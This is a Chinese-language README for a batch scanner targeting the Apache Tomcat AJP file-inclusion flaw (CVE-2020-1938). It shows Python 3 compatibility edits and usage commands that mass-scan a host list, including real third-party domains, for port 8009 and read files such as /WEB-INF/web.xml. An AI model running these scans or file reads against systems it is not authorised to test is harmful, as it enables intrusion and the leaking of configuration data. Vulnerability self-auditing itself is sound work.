# 说明
**工具仅用于安全研究以及内部自查, 禁止使用工具发起非法攻击, 造成的后果由使用者负责**

Apache Tomcat文件包含漏洞（CVE-2020-1938 / CNVD-2020-1048 ）批量检测工具. 

此项目在[Kit4y的项目](https://github.com/Kit4y/CNVD-2020-10487-Tomcat-Ajp-lfi-Scanner)的基础上进行修改. 

# 代码修改
</pre>
修改少量代码, 以兼容Python3. 修改前的代码
<pre>
self.stream = self.socket.makefile("rb", bufsize=0)
</pre>
<pre>
print("".join([d.data for d in data]))
</pre>
修改后的代码
<pre>
if sys.version_info < (3, 0):
    self.stream = self.socket.makefile("rb", bufsize=0)
else:
    self.stream = self.socket.makefile("rb", buffering=None)
</pre>
<pre>
if sys.version_info < (3, 0):
    print("".join([d.data for d in data]))
else:
    print(b"".join([d.data for d in data]).decode("UTF-8"))
</pre>


# 使用
## 批量检测
**1、将需要扫描的域名/ip放于 ip.txt, 如**
> 127.0.0.1  
> www.baidu.com  
> www.google.com  

**2、python threading-find-port-8009.py**

扫描ip.txt中域名/ip找出开放8009端口的, 存放于生成的8009.txt中 

**3、python threading-CNVD-2020-10487-Tomcat-Ajp-lfi.py**

从8009.txt中筛选出符合漏洞的url, 放置于vul.txt中. 最后vul.txt中存在的域名即为含有漏洞的域名

## 单站点检测
python CNVD-2020-10487-Tomcat-Ajp-lfi.py target.com
> python CNVD-2020-10487-Tomcat-Ajp-lfi.py -f /WEB-INF/web.xml 192.168.125.128  
> 
> python CNVD-2020-10487-Tomcat-Ajp-lfi.py -f /index.jsp 192.168.125.128

# 其他相关工具
https://github.com/0nise/CVE-2020-1938  
https://github.com/hypn0s/AJPy
https://github.com/00theway/Ghostcat-CNVD-2020-10487